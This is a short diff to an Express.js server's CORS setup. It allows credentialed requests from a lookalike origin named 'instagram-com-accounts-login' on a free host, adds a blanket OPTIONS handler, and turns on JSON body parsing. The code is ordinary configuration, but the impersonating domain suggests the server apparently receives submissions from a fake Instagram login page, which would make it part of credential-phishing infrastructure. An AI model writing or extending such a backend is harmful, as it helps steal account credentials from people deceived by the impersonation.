@@ -7,8 +7,16 @@ const app = express();
 app.use(cors({
   origin: 'https://instagram-com-accounts-login-87xa.onrender.com',
   methods: ['GET', 'POST', 'OPTIONS'],
-  allowedHeaders: ['Content-Type']   
+  allowedHeaders: ['Content-Type'],
+  credentials: true,  
 }));
+
+app.options('*', (req, res) => {
+  res.sendStatus(204);
+});
+
+app.use(express.json());
+
 
 app.use(express.static(path.join(__dirname, 'frontend')));
 app.get('/', (req, res) => {
